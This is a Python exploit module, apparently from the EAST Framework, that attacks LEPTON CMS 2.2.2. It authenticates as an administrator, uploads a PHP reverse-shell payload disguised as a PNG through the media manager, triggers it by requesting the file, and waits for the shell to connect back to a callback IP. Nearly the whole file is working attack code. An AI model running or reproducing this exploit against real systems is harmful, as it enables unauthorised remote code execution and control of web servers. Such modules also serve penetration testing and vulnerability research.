#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import re
import time
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_lepton_fu"
INFO['DESCRIPTION'] = "LEPTON 2.2.2 - Remote Code Execution"
INFO['VENDOR'] = "http://www.lepton-cms.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40801/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Lepton is a content management system written in PHP. In version 2.2.2, it is vulnerable to code execution as it is possible to upload files with dangerous type via the media manager.
"""

INFO['CHANGELOG'] = "05 Dec, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS['USERNAME'] = 'admin', dict(description = 'Username')
OPTIONS['PASSWORD'] = 'password', dict(description = 'Password')
OPTIONS["BASEPATH"] = '/LEPTON/upload/', dict(description = 'Basepath of Lepton')
OPTIONS["CALLBACK_IP"] = "192.168.1.49", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.username = ''
        self.password = ''
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
        
    def make_data(self, name, content):
        data = ''
        
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="action"\r\n\r\n'
        data += 'media_upload'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="current_dir"\r\n\r\n'
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="upload[]"; filename="{}"\r\n'.format(name)
        data += 'Content-Type: image/png\r\n\r\n'
        data += content
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="submit"\r\n\r\n'
        data += 'Upload File(s)'
        data += '\r\n--o0oOo0o--\r\n'
        
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        
        self.log('Authentificating with {}:{}'.format(self.username, self.password))
        try:
            fd = urllib2.urlopen(self.make_url('/admins/login/index.php'))
            data = fd.read()
            cookie = fd.headers['set-cookie']
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        user_input = re.findall('username_(.[a-z0-9]+)"', data)[1]
        pass_input = re.findall('password_(.[a-z0-9]+)"', data)[1]
        data = 'username_fieldname=username_{user_input}&password_fieldname=password_{pass_input}&username_{user_input}={user_user}&password_{pass_input}={user_pass}&submit=Login'.format(user_input=user_input, pass_input=pass_input, user_user=self.username, user_pass=self.password)
        
        try:
            request = urllib2.Request(self.make_url('/admins/login/index.php'), data)
            request.add_header('Cookie', cookie)
            fd = urllib2.urlopen(request)
            url = fd.geturl()
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('It is OK! Cookies: {}, url: {}'.format(cookie, url))
        self.log('Now we can try to upload file!')
        
        data = self.make_data('east.png.php5', self.make_sploit()[1:])
        request = urllib2.Request(url.replace('start', 'media'), data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        request.add_header('Cookie', cookie)
        request.add_header('Upgrade-Insecure-Requests', 1)

        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('All files uploaded. Execute east.png.php5 ...')
        try:
            urllib2.urlopen(self.make_url('/media/east.png.php5'), timeout=3)
        except Exception as e:
            pass
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
